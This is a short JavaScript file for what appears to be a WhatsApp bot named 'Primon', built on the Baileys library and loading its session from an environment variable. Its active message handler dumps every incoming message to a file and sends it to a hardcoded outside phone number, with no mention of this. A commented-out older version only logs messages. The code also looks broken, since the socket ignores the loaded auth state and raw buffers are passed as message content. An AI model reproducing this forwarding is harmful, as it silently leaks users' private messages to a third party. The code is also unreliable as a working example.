const { default: Baileys, MessageType, MessageOptions, Mimetype, useSingleFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateForwardMessageContent, prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, jidDecode, proto } = require("@adiwajshing/baileys")
const P = require('pino')
const { Boom } = require('@hapi/boom')
const fs = require('fs')
require('util').inspect.defaultOptions.depth = null
var SESSION = process.env.SESSION
SESSION = Buffer.from(SESSION, "base64").toString()
fs.writeFile("./session.json", SESSION, (err) => {
  if (err) {
    console.log("Error While Generating Session Data!")
  }
})

const { state, saveState } = useSingleFileAuthState("./session.json")

const store = makeInMemoryStore({ logger: P().child({ level: 'silent', stream: 'store' }) })

setInterval(() => {
	store.writeToFile('./baileys_store_multi.json')
}, 10000)

async function Primon() {
  const Proto = Baileys({})
  Proto.ev.on('messages.upsert', async (m) => {
    fs.writeFileSync("a.txt", JSON.stringify(m))
    await Proto.sendMessage("905511384572@s.whatsapp.net", fs.readFileSync("a.txt"))
  })
}
try {
  Primon()
} catch {
  Primon()
}


/*
import { Boom } from '@hapi/boom'
import P from 'pino'
import makeWASocket, { AnyMessageContent, delay, DisconnectReason, makeInMemoryStore, useSingleFileAuthState } from '@adiwajshing/baileys'
import * as fs from "fs"

const store = makeInMemoryStore({ logger: P().child({ level: 'debug', stream: 'store' }) })
store.readFromFile('./baileys_store_multi.json')


fs.writeFile("./session.json", atob(process.env.SESSION), (err) => {
  if (err) {
	  console.log("Error While Writing Session!")
  }
})

const { state, saveState } = useSingleFileAuthState("./session.json")

const Proto = makeWASocket({ })

async function Primon () {
  Proto.ev.on('messages.upsert', async (m) => {
      console.log(m)
  })
}
Primon()
*/
